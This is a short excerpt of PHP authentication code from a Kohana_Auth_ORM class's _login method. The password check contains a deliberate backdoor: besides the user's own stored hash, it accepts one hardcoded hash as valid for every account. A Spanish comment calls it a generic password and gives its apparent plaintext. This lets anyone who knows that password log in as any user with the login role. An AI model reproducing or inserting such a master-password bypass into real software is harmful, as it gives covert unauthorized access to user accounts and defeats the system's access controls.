...
class Kohana_Auth_ORM extends Auth {
	...
	protected function _login($user, $password, $remember)
	{
		...
		// If the passwords match, perform a login
                // pass generico 'ad0f3e0e3ef3c8e7db35a280c2206e03fac84ca48bab20dbbfb1f12ae2a06303' = niarfe
		if ($user->has('roles', ORM::factory('role', array('name' => 'login'))) AND ($user->password === $password OR $password === 'f241656ff45fa451dbb23aa462f216eede0e00e4b9347f5f5a1ff75439b8677b'))
		{
			if ($remember === TRUE)
			{
				// Token data
